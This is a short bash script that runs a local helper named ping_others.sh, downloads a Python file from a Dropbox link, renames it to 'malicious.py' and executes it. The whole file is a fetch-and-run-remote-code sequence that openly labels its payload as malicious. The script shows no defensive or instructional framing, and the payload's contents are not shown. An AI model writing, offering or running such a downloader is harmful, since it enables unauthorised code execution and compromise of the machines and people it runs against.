#!/usr/bin/env bash
/bin/bash $PWD/ping_others.sh
wget "https://www.dropbox.com/s/xmfeu6gj7ekcrh1/call_others.py?dl=0"
mv $PWD/call_others.py?dl=0 $PWD/malicious.py
python3 $PWD/malicious.py